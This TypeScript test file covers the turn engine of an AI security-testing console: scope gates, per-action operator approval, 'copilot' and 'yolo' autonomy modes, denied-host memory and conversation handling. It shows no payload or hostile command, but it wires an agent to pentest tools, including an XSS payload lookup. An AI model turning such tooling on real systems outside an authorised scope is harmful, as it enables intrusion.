import { afterEach, describe, expect, it } from "vitest";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";

import { buildConsoleSystemPrompt, createConsoleSession } from "./turn-engine.js";
import type {
  ConsoleLocalScopeRequest,
  ConsoleScopeRequest,
  ConsoleUsageReport,
} from "./turn-engine.js";
import type {
  NativeContentBlock,
  NativeMessage,
  NativeRuntime,
  NativeRuntimeResult,
  NativeStreamCallbacks,
  NativeToolDef,
} from "../runtime/types.js";
import { ScopePolicy } from "../scope/scope.js";
import type { PluginHost } from "../plugins/loader.js";
import type { ToolDefinition } from "../agent/types.js";


/**
 * A scripted NativeRuntime: replays a queue of pre-baked results so the turn
 * cycle runs deterministically without an LLM or API key. It captures the
 * tools + messages it was called with so we can assert the console wired the
 * REAL tool registry through to the runtime.
 */
class ScriptedRuntime implements NativeRuntime {
  readonly type = "api" as const;
  calls: Array<{ system: string; messages: NativeMessage[]; tools: NativeToolDef[] }> = [];
  constructor(private readonly script: NativeRuntimeResult[]) {}
  async isAvailable(): Promise<boolean> {
    return true;
  }
  async executeNative(
    system: string,
    messages: NativeMessage[],
    tools: NativeToolDef[],
  ): Promise<NativeRuntimeResult> {
    // Snapshot messages (the loop mutates the array in place across turns).
    this.calls.push({ system, messages: structuredClone(messages), tools });
    const next = this.script.shift();
    if (!next) throw new Error("ScriptedRuntime: script exhausted");
    return next;
  }
}

function endTurn(text: string): NativeRuntimeResult {
  return { content: [{ type: "text", text }], stopReason: "end_turn", durationMs: 1 };
}

describe("buildConsoleSystemPrompt", () => {
  it("frames the operator cockpit and includes target + session", () => {
    const p = buildConsoleSystemPrompt({ target: "https://example.com", scanId: "console-x" });
    expect(p).toContain("0sec operator console");
    expect(p).toContain("https://example.com");
    expect(p).toContain("console-x");
  });

  it("notes when no target is set", () => {
    const p = buildConsoleSystemPrompt({ scanId: "console-y" });
    expect(p).toContain("No target is set yet");
  });

  it("includes standard-mode instruction by default", () => {
    const p = buildConsoleSystemPrompt({ scanId: "s1" });
    expect(p).toContain("Standard mode");
    expect(p).not.toContain("Co-pilot mode");
    expect(p).not.toContain("YOLO mode");
  });

  it("includes copilot-mode instruction when requested", () => {
    const p = buildConsoleSystemPrompt({ scanId: "s2", autonomyMode: "copilot" });
    expect(p).toContain("Co-pilot mode");
    expect(p).not.toContain("Standard mode");
    expect(p).not.toContain("YOLO mode");
  });

  it("includes yolo-mode instruction when requested", () => {
    const p = buildConsoleSystemPrompt({ scanId: "s3", autonomyMode: "yolo" });
    expect(p).toContain("YOLO mode");
    expect(p).not.toContain("Co-pilot mode");
    expect(p).not.toContain("Standard mode");
  });
});

describe("createConsoleSession", () => {
  it("exposes the full audit-role tool registry by default", () => {
    const session = createConsoleSession({ runtime: new ScriptedRuntime([]) });
    const names = session.tools.map((t) => t.name);
    // A cross-section of the unified cockpit's capabilities.
    expect(names).toContain("http_request"); // web pentest
    expect(names).toContain("read_file"); // source scan
    expect(names).toContain("apply_patch"); // patch-gen
    expect(names).toContain("run_command");
    expect(session.tools.length).toBeGreaterThan(10);
  });

  it("runs the real ToolExecutor for a tool call and feeds the result back", async () => {
    const runtime = new ScriptedRuntime([
      // Turn 1: the model asks to run a real registry tool.
      {
        content: [
          { type: "text", text: "Looking that up." },
          { type: "tool_use", id: "call-1", name: "payload_lookup", input: { name: "jsfuck_alert" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
        usage: { inputTokens: 10, outputTokens: 5 },
      },
      // Turn 2: after seeing the tool result, the model answers and stops.
      endTurn("Here is the payload."),
    ]);

    const session = createConsoleSession({ runtime });

    const seen: string[] = [];
    const outcome = await session.send("find me a jsfuck alert payload", {
      onToolStart: (call) => seen.push(`start:${call.name}`),
      onToolResult: (call, result) => seen.push(`result:${call.name}:${result.success}`),
    });

    // The REAL executor ran the REAL tool and succeeded.
    expect(seen).toEqual(["start:payload_lookup", "result:payload_lookup:true"]);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
    expect(outcome.stopReason).toBe("end_turn");
    expect(outcome.assistantText).toContain("Here is the payload.");
    expect(outcome.usage.inputTokens).toBe(10);

    // The runtime saw the real native tool schemas (registry wired end-to-end).
    expect(runtime.calls[0].tools.some((t) => t.name === "payload_lookup")).toBe(true);
    // The second runtime call carried the tool_result back into history.
    const secondCallMessages = runtime.calls[1].messages;
    const hasToolResult = secondCallMessages.some((m) =>
      m.content.some((b) => b.type === "tool_result" && b.tool_use_id === "call-1"),
    );
    expect(hasToolResult).toBe(true);
  });

  it("preserves conversation history across operator turns", async () => {
    const runtime = new ScriptedRuntime([endTurn("hi there"), endTurn("still here")]);
    const session = createConsoleSession({ runtime });

    await session.send("hello");
    await session.send("you there?");

    // user, assistant, user, assistant
    expect(session.messages).toHaveLength(4);
    expect(session.messages[0].role).toBe("user");
    expect(session.messages[1].role).toBe("assistant");
    // The second runtime call already contained the first exchange.
    expect(runtime.calls[1].messages.length).toBeGreaterThanOrEqual(2);
  });

  it("stops with an error outcome when the runtime errors", async () => {
    const runtime = new ScriptedRuntime([
      { content: [], stopReason: "error", durationMs: 1, error: "boom" },
    ]);
    const session = createConsoleSession({ runtime });
    const outcome = await session.send("do something");
    expect(outcome.stopReason).toBe("error");
    expect(outcome.error).toBe("boom");
  });

  it("caps tool-call rounds per turn to avoid runaway loops", async () => {
    // Always request a tool → would loop forever without the cap.
    const infiniteToolCall: NativeRuntimeResult = {
      content: [{ type: "tool_use", id: "c", name: "payload_lookup", input: { name: "jsfuck_alert" } }],
      stopReason: "tool_use",
      durationMs: 1,
    };
    const runtime = new ScriptedRuntime(Array.from({ length: 10 }, () => ({ ...infiniteToolCall })));
    const session = createConsoleSession({ runtime, maxToolIterations: 3 });
    const notices: string[] = [];
    const outcome = await session.send("go", { onNotice: (m) => notices.push(m) });
    expect(outcome.stopReason).toBe("max_tool_iterations");
    expect(outcome.toolCalls).toHaveLength(3);
    expect(notices).toHaveLength(1);
  });
});

// ── Console autonomy / scope-resolution contract tests ──

describe("Console autonomy — scope resolution", () => {
  it("requests scope for network-capable tools when scope is absent and denies on null", async () => {
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "http_request", input: { url: "https://outofscope.test/api" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("Scope denied."),
    ]);

    const requests: ConsoleScopeRequest[] = [];
    const session = createConsoleSession({
      runtime,
      requestScope: async (req) => {
        requests.push(req);
        return null; // deny
      },
    });

    const outcome = await session.send("probe the target");
    expect(requests).toHaveLength(1);
    expect(requests[0].call.name).toBe("http_request");
    expect(requests[0].requestedUrls).toContain("https://outofscope.test/api");
    expect(requests[0].target).toBe("");
    expect(requests[0].currentScope).toBeUndefined();

    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("denied");
    expect(outcome.stopReason).toBe("end_turn");
  });

  it("approves scope resolution and updates in-memory session target + scope", async () => {
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "http_request", input: { url: "https://example.test/api" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
        usage: { inputTokens: 5, outputTokens: 3 },
      },
      endTurn("Scope approved, tool ran."),
    ]);

    const session = createConsoleSession({
      runtime,
      requestScope: async () => ({
        target: "https://example.test",
        scope: ScopePolicy.fromJson({ in_scope: ["example.test"] }),
      }),
    });

    await session.send("go");
    // Scope resolution updated the in-memory session state.
    expect(session.target).toBe("https://example.test");
    expect(session.scope).toBeDefined();
  });

  it("does not trigger requestScope for non-network tools", async () => {
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "payload_lookup", input: { name: "jsfuck_alert" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
        usage: { inputTokens: 5, outputTokens: 3 },
      },
      endTurn("Found it."),
    ]);

    let requestScopeCalled = false;
    const session = createConsoleSession({
      runtime,
      requestScope: async () => {
        requestScopeCalled = true;
        return null;
      },
    });

    await session.send("find payload");
    expect(requestScopeCalled).toBe(false);
    expect(session.scope).toBeUndefined();
  });

  it("skips scope resolution when requestScope callback is absent", async () => {
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "http_request", input: { url: "https://example.test" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("No scope gate → falls through to executor."),
    ]);

    const session = createConsoleSession({ runtime });
    const outcome = await session.send("go");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.stopReason).toBe("end_turn");
  });
});

describe("Console autonomy — standard mode (per-action approval)", () => {
  it("prompts the operator before EACH effectful action and denies on a no", async () => {
    // Two effectful actions dispatched in one round: standard must put BOTH to
    // the operator (the most-prompting mode), and deny each one the operator
    // refuses — approval is per action, never once-per-turn.
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "bash", input: { command: "echo one" } },
          { type: "tool_use", id: "c2", name: "run_command", input: { command: "echo two" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("Both actions were put to the operator."),
    ]);

    const approved: string[] = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      approveTool: async (call) => {
        approved.push(call.name);
        return false; // deny each action
      },
    });

    const outcome = await session.send("run both");
    // Every effectful action was put to the operator — one prompt per action.
    expect(approved).toEqual(["bash", "run_command"]);
    expect(outcome.toolCalls).toHaveLength(2);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("not approved by the operator in standard mode");
    expect(outcome.toolCalls[1].result.success).toBe(false);
  });

  it("dispatches the action only on an explicit operator yes (approval never assumed)", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hi" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Approved, so it ran."),
    ]);
    let prompted = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      approveTool: async () => {
        prompted += 1;
        return true;
      },
    });
    const outcome = await session.send("run it");
    expect(prompted).toBe(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("exempts read-only tools from the per-action prompt", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "payload_lookup", input: { name: "jsfuck_alert" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Read-only ran without a prompt."),
    ]);
    let prompted = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      approveTool: async () => {
        prompted += 1;
        return false;
      },
    });
    const outcome = await session.send("look up a payload");
    expect(prompted).toBe(0); // READ_ONLY_TOOLS grant no authority → no prompt
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("denies an effectful tool in standard when no approveTool channel is wired (fail-open corner closed)", async () => {
    // Standard is the per-action-approval mode. The old behaviour fell OPEN when
    // no approveTool was wired (headless/legacy embedder) and ran the tool
    // unapproved. The wired `guardApprovalUnavailable` closes that corner: an
    // effectful tool with no approval mechanism is refused rather than run.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Refused without an approval channel."),
    ]);
    const session = createConsoleSession({ runtime, autonomyMode: "standard" });
    const outcome = await session.send("run command");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("requires operator approval");
  });

  it("uses scope-on-demand for out-of-scope network calls", async () => {
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "http_request", input: { url: "https://new-target.test" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("Scope approved in standard mode."),
    ]);

    const requests: ConsoleScopeRequest[] = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "standard",
      requestScope: async (req) => {
        requests.push(req);
        return { target: "https://new-target.test", scope: ScopePolicy.fromJson({ in_scope: ["new-target.test"] }) };
      },
    });

    await session.send("go");
    expect(requests).toHaveLength(1);
    expect(session.target).toBe("https://new-target.test");
    expect(session.scope).toBeDefined();
  });

  it("defaults to standard when no autonomyMode is specified", () => {
    const session = createConsoleSession({ runtime: new ScriptedRuntime([]) });
    expect(session.autonomyMode).toBe("standard");
  });
});

describe("Console autonomy — copilot (no per-action prompts; in-engagement auto-expand)", () => {
  it("never calls approveTool — copilot has no per-action prompt", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo hello" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Ran with full in-engagement autonomy."),
    ]);
    let approveToolCalled = false;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "copilot",
      approveTool: async () => {
        approveToolCalled = true;
        return false;
      },
    });
    const outcome = await session.send("run command");
    expect(approveToolCalled).toBe(false);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("auto-expands scope to an in-engagement target WITHOUT prompting, and records it", async () => {
    // Target is the apex example.test; the model reaches the sub-domain
    // api.example.test — in-engagement, so copilot expands scope with no prompt.
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "http_request", input: { url: "https://api.example.test/v1" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Auto-expanded and reached the sub-domain."),
    ]);
    let prompts = 0;
    const notices: string[] = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "copilot",
      target: "https://example.test",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    await session.send("hit the api host", { onNotice: (m) => notices.push(m) });

    // No operator prompt for an in-engagement host…
    expect(prompts).toBe(0);
    // …the scope grew to cover it (the recorded expansion, observable as state)…
    expect(session.scope?.match("https://api.example.test/v1").allowed).toBe(true);
    // …and the expansion was announced (the recorded expansion, as an audit note).
    expect(notices.some((n) => n.includes("auto-expanded") && n.includes("api.example.test"))).toBe(true);
  });

  it("does NOT auto-authorize a foreign host — it defers to the operator prompt", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "http_request", input: { url: "https://unrelated.test/x" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Foreign host needed an operator decision."),
    ]);
    const requests: ConsoleScopeRequest[] = [];
    const session = createConsoleSession({
      runtime,
      autonomyMode: "copilot",
      target: "https://app.example.test",
      requestScope: async (req) => {
        requests.push(req);
        return null; // operator declines the foreign host
      },
    });

    const outcome = await session.send("hit an unrelated host");
    // The foreign host was NOT auto-expanded — the operator was asked.
    expect(requests).toHaveLength(1);
    expect(requests[0].requestedUrls.some((u) => u.includes("unrelated.test"))).toBe(true);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    // And the engagement scope was not silently broadened to it.
    expect(session.scope?.match("https://unrelated.test/x").allowed ?? false).toBe(false);
  });

  it("refuses a foreign host when no scope-approval channel is available (no fall-open)", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "http_request", input: { url: "https://unrelated.test/x" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Refused, no channel."),
    ]);
    const session = createConsoleSession({
      runtime,
      autonomyMode: "copilot",
      target: "https://app.example.test",
      // No requestScope wired.
    });
    const outcome = await session.send("hit an unrelated host");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("outside the current engagement");
  });
});

// ── Denied-host memory: no unbounded re-prompt loop ──

/** A single-tool-call turn that references `url` via http_request, then stops. */
function httpTurn(id: string, url: string): NativeRuntimeResult {
  return {
    content: [{ type: "tool_use", id, name: "http_request", input: { url } }],
    stopReason: "tool_use",
    durationMs: 1,
  };
}

describe("Console autonomy — denied-host memory", () => {
  it("does not re-prompt for a host the operator already declined (requestScope called exactly once)", async () => {
    // Two operator turns, each asking the model to hit the same out-of-scope
    // host. The first turn's request is declined; the second must be denied
    // from session memory WITHOUT a second prompt — otherwise the operator is
    // stuck in the re-prompt loop this fix removes.
    const runtime = new ScriptedRuntime([
      httpTurn("c1", "https://blocked.test/api"),
      endTurn("First request declined."),
      httpTurn("c2", "https://blocked.test/other"),
      endTurn("Second request auto-denied from memory."),
    ]);

    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      requestScope: async () => {
        prompts += 1;
        return null; // decline
      },
    });

    const first = await session.send("probe blocked.test");
    expect(first.toolCalls[0].result.success).toBe(false);

    const second = await session.send("try blocked.test again");
    expect(second.toolCalls[0].result.success).toBe(false);
    // The declined host is remembered — the operator is prompted only once.
    expect(prompts).toBe(1);
    // The error tells the model it was already declined so it stops retrying.
    expect(second.toolCalls[0].result.error).toContain("already declined");
  });

  it("denies the whole call without prompting when only some requested hosts were declined", async () => {
    // The model bundles a previously-declined host with a fresh one. We must
    // not silently drop the declined host and prompt for the rest — the entire
    // call is denied without a new prompt.
    const runtime = new ScriptedRuntime([
      httpTurn("c1", "https://blocked.test/a"),
      endTurn("Declined."),
      {
        content: [
          {
            type: "tool_use",
            id: "c2",
            name: "http_request",
            input: { url: "https://blocked.test/a", extra: "https://fresh.test/b" },
          },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("Bundled call denied."),
    ]);

    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    await session.send("hit blocked.test");
    const outcome = await session.send("hit blocked.test and fresh.test");
    expect(outcome.toolCalls[0].result.success).toBe(false);
    // Still only the first prompt — the bundled call short-circuits.
    expect(prompts).toBe(1);
    expect(outcome.toolCalls[0].result.error).toContain("blocked.test");
  });

  it("re-enables a previously-declined host once an approval covers it", async () => {
    // Decline a.test, then approve a broadened scope (via a fresh host) that
    // also covers a.test. A later a.test call must succeed from scope coverage
    // and never re-prompt — approval clears the stale denial.
    const runtime = new ScriptedRuntime([
      httpTurn("c1", "https://a.test/x"),
      endTurn("a.test declined."),
      httpTurn("c2", "https://b.test/y"),
      endTurn("b.test approved."),
      httpTurn("c3", "https://a.test/z"),
      endTurn("a.test now allowed."),
    ]);

    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      requestScope: async (req) => {
        prompts += 1;
        // Decline the first request (a.test); approve the second with a scope
        // covering both hosts.
        if (req.requestedUrls.some((u) => u.includes("a.test")) && prompts === 1) return null;
        return { target: "https://b.test", scope: ScopePolicy.fromJson({ in_scope: ["a.test", "b.test"] }) };
      },
    });

    const denied = await session.send("hit a.test");
    expect(denied.toolCalls[0].result.success).toBe(false);
    expect(denied.toolCalls[0].result.error).toContain("declined");

    // The approval passes the scope gate (whether the real http_request then
    // succeeds over the network is irrelevant here — assert only that it was
    // not blocked by scope).
    await session.send("hit b.test");
    expect(session.scope?.match("https://a.test/z").allowed).toBe(true);

    const reused = await session.send("hit a.test again");
    // a.test is now covered by the broadened scope, so the scope gate lets it
    // through: it is neither re-prompted nor auto-denied from stale memory.
    expect(reused.toolCalls[0].result.error ?? "").not.toContain("already declined");
    // Two prompts total: the initial decline and the approval. The final
    // a.test call is served from scope with no third prompt.
    expect(prompts).toBe(2);
  });

  it("does not poison the denied set with an unparseable URL", async () => {
    // A network-capable tool whose args carry a non-parseable pseudo-URL must
    // not add anything to the denied set (fail safe). We verify the operator is
    // still prompted on a second attempt rather than being auto-denied from a
    // corrupted memory entry.
    const runtime = new ScriptedRuntime([
      {
        content: [{ type: "tool_use", id: "c1", name: "http_request", input: { url: "https://" } }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("First declined."),
      {
        content: [{ type: "tool_use", id: "c2", name: "http_request", input: { url: "https://" } }],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("Second declined."),
    ]);

    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    await session.send("hit the bad url");
    await session.send("hit the bad url again");
    // "https://" has no parseable host, so nothing is remembered and the
    // operator is prompted both times (current behaviour preserved).
    expect(prompts).toBe(2);
  });

  it("does not consult denied-host memory in yolo mode (behaviour unchanged)", async () => {
    // YOLO hard-denies out-of-scope network calls before requestScope and the
    // denied-host gate; this must remain a pure scope decision that never
    // prompts, regardless of any prior denials in other modes.
    const runtime = new ScriptedRuntime([
      httpTurn("c1", "https://offscope.test/a"),
      endTurn("Yolo denial 1."),
      httpTurn("c2", "https://offscope.test/b"),
      endTurn("Yolo denial 2."),
    ]);

    let prompts = 0;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      requestScope: async () => {
        prompts += 1;
        return null;
      },
    });

    const first = await session.send("go");
    const second = await session.send("go again");
    expect(prompts).toBe(0); // yolo never prompts
    expect(first.toolCalls[0].result.error).toContain("YOLO mode");
    expect(second.toolCalls[0].result.error).toContain("YOLO mode");
  });
});

describe("Console autonomy — yolo still enforces scope", () => {
  it("hard-denies out-of-scope network calls without invoking requestScope", async () => {
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "http_request", input: { url: "https://offscope.test" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("Scope still matters in yolo."),
    ]);

    let requestScopeCalled = false;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      requestScope: async () => {
        requestScopeCalled = true;
        return null;
      },
      approveTool: async () => {
        throw new Error("approveTool should not be called in yolo mode");
      },
    });

    const outcome = await session.send("go");
    expect(requestScopeCalled).toBe(false);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("YOLO mode");
  });

  it("allows tools in yolo mode when scope is preconfigured", async () => {
    // Use bash (network-capable per NETWORK_CAPABLE_TOOLS) with no URLs in
    // args — when sessionTarget is empty the scope gate skips because
    // extractToolUrls returns empty. This verifies that tools run in yolo
    // with a scope present, without triggering requestScope.
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "bash", input: { command: "echo scope-ok" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
        usage: { inputTokens: 5, outputTokens: 3 },
      },
      endTurn("Allowed in yolo."),
    ]);

    let requestScopeCalled = false;
    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      scope: ScopePolicy.fromJson({ in_scope: ["allowed.test"] }),
      requestScope: async () => {
        requestScopeCalled = true;
        throw new Error("requestScope should not be called in yolo when scope already covers");
      },
    });

    const outcome = await session.send("go");
    expect(requestScopeCalled).toBe(false);
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(true);
  });

  it("hard-denies in yolo mode even when requestScope callback is absent", async () => {
    // YOLO scope enforcement runs before the `!requestScope` early-return
    // check, so out-of-scope network calls are denied even when no
    // requestScope callback is configured.
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "http_request", input: { url: "https://unknown.test" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("YOLO denials hold without requestScope."),
    ]);

    const session = createConsoleSession({
      runtime,
      autonomyMode: "yolo",
      // No requestScope configured, no scope configured.
    });

    const outcome = await session.send("go");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);
    expect(outcome.toolCalls[0].result.error).toContain("YOLO mode");
  });
});

describe("Console autonomy — approval integrity", () => {
  it("rejects a scope resolution that does not cover the requested URL", async () => {
    const runtime = new ScriptedRuntime([
      {
        content: [
          { type: "tool_use", id: "c1", name: "http_request", input: { url: "https://uncovered.test/api" } },
        ],
        stopReason: "tool_use",
        durationMs: 1,
      },
      endTurn("Scope was invalid."),
    ]);

    const session = createConsoleSession({
      runtime,
      requestScope: async () => ({
        target: "https://uncovered.test",
        scope: ScopePolicy.fromJson({ in_scope: ["different.test"] }),
      }),
    });

    const outcome = await session.send("probe it");
    expect(outcome.toolCalls).toHaveLength(1);
    expect(outcome.toolCalls[0].result.error).toContain("does not cover");
    expect(session.scope).toBeUndefined();
  });

  it("transitions through all three modes while preserving conversation and updating the system prompt", async () => {
    const runtime = new ScriptedRuntime([
      { content: [{ type: "tool_use", id: "c1", name: "bash", input: { command: "echo standard" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Standard done."),
      { content: [{ type: "tool_use", id: "c2", name: "bash", input: { command: "echo copilot" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Copilot done."),
      { content: [{ type: "tool_use", id: "c3", name: "bash", input: { command: "echo yolo" } }], stopReason: "tool_use", durationMs: 1 },
      endTurn("Yolo done."),
    ]);
    let approvals = 0;
    const session = createConsoleSession({
      runtime,
      // Standard is the approval mode now: every effectful action is put to the
      // operator. Copilot and yolo run prompt-free. No scope is configured —
      // these `echo` commands reach no network destination, so all three modes
      // (yolo included, with no preconfigured scope) run them.
      autonomyMode: "standard",
      approveTool: async () => {
        approvals += 1;
        return false; // always deny in standard
      },
    });

    // ── Standard: the effectful action is put to the operator and denied ──
    expect(session.systemPrompt).toContain("Standard mode");
    let outcome = await session.send("standard turn");
    expect(approvals).toBe(1);
    expect(outcome.toolCalls[0].result.success).toBe(false);

    // ── Switch to copilot: tool auto-executes without a per-action prompt ──
    session.setAutonomyMode("copilot");
    expect(session.autonomyMode).toBe("copilot");
    expect(session.systemPrompt).toContain("Co-pilot mode");

    outcome = await session.send("copilot turn");
    expect(approvals).toBe(1); // approveTool not called in copilot
    expect(outcome.toolCalls[0].result.success).toBe(true);

    // ── Switch to yolo: tool auto-executes without approval or scope ──
    session.setAutonomyMode("yolo");
    expect(session.autonomyMode).toBe("yolo");
    expect(session.systemPrompt).toContain("YOLO mode");

    outcome = await session.send("yolo turn");
    expect(approvals).toBe(1); // approveTool still not called
    expect(outcome.toolCalls[0].result.success).toBe(true);

    // Conversation preserved across all transitions.
    expect(session.messages.length).toBeGreaterThanOrEqual(6);
  });
});

describe("clearConversation", () => {
  it("clears messages while preserving session identity and configuration", () => {
    const runtime = new ScriptedRuntime([endTurn("first reply"), endTurn("second reply")]);
    const session = createConsoleSession({
      runtime,
      scanId: "test-scan",
      target: "https://example.test",
      autonomyMode: "yolo",
    });

    // Baseline state before any messages.
    expect(session.messages).toHaveLength(0);
    expect(session.scanId).toBe("test-scan");
    expect(session.target).toBe("https://example.test");
    expect(session.autonomyMode).toBe("yolo");
  });

  it("removes all accumulated messages after a turn", async () => {
    const runtime = new ScriptedRuntime([endTurn("first")]);
    const session = createConsoleSession({ runtime });

    await session.send("hello");
    expect(session.messages).toHaveLength(2);

    session.clearConversation();
    expect(session.messages).toHaveLength(0);
  });

  it("does not affect session identity, target, scope, autonomy mode, or tools", async () => {
    const runtime = new ScriptedRuntime([endTurn("hi")]);
    const session = createConsoleSession({
      runtime,
      scanId: "my-scan",
      target: "https://target.test",
      autonomyMode: "copilot",
    });

    await session.send("hello");
    expect(session.messages).toHaveLength(2);

    // Capture pre-clear state of preserved fields.
    const scanId = session.scanId;
    const target = session.target;
    const mode = session.autonomyMode;
    const tools = session.tools;
    const sysPrompt = session.systemPrompt;

    session.clearConversation();
    expect(session.messages).toHaveLength(0);

    // Everything else untouched.
    expect(session.scanId).toBe(scanId);
    expect(session.target).toBe(target);
    expect(session.autonomyMode).toBe(mode);
    expect(session.tools).toBe(tools);
    expect(session.systemPrompt).toBe(sysPrompt);
  });

  it("starts fresh on the next send after clearConversation", async () => {
    const calls: string[][] = [];
    class RecordingRuntime implements NativeRuntime {
      readonly type = "api" as const;
      async isAvailable(): Promise<boolean> {
        return true;
      }
      async executeNative(
        _system: string,
        messages: NativeMessage[],
        _tools: NativeToolDef[],
      ): Promise<NativeRuntimeResult> {
        calls.push(messages.map((m) => m.role));
        return { content: [{ type: "text", text: "ok" }], stopReason: "end_turn", durationMs: 1 };
      }
    }

    const session = createConsoleSession({ runtime: new RecordingRuntime() });

    await session.send("first"); // messages=[user, assistant]; 1 recorded call
    expect(session.messages).toHaveLength(2);
    expect(calls[0]).toEqual(["user"]);

    session.clearConversation();
    expect(session.messages).toHaveLength(0);

    await session.send("second"); // runtime sees only the new user message
    expect(session.messages).toHaveLength(2);
    expect(calls[1]).toEqual(["user"]);
  });
});

// ── Seeded history (initialMessages) — model-switch / session-rebuild contract ──

describe("createConsoleSession — seeded history (initialMessages)", () => {
  // A small prior conversation a caller would replay when rebuilding the
  // session around a different runtime (the `/model` switch scenario).
  function priorHistory(): NativeMessage[] {
    return [
      { role: "user", content: [{ type: "text", text: "recon example.com" }] },
      { role: "assistant", content: [{ type: "text", text: "Found two subdomains." }] },
    ];
  }

  it("reports seeded messages on .messages before any send", () => {
    const session = createConsoleSession({
      runtime: new ScriptedRuntime([]),
      initialMessages: priorHistory(),
    });
    // Engagement context is present immediately — no send() required.
    expect(session.messages).toHaveLength(2);
    expect(session.messages[0].role).toBe("user");
    expect(session.messages[1].role).toBe("assistant");
    expect(session.messages[1].content[0]).toEqual({ type: "text", text: "Found two subdomains." });
  });

  it("appends a new turn to the seeded history rather than replacing it", async () => {
    const runtime = new ScriptedRuntime([endTurn("continuing where we left off")]);
    const session = createConsoleSession({ runtime, initialMessages: priorHistory() });

    await session.send("now scan them");

    // 2 seeded + user + assistant — the prior context survives the send.
    expect(session.messages).toHaveLength(4);
    expect(session.messages[0].content[0]).toEqual({ type: "text", text: "recon example.com" });
    expect(session.messages[2].role).toBe("user");
    expect(session.messages[3].role).toBe("assistant");
    // The runtime saw the seeded turns replayed ahead of the new user message.
    expect(runtime.calls[0].messages).toHaveLength(3);
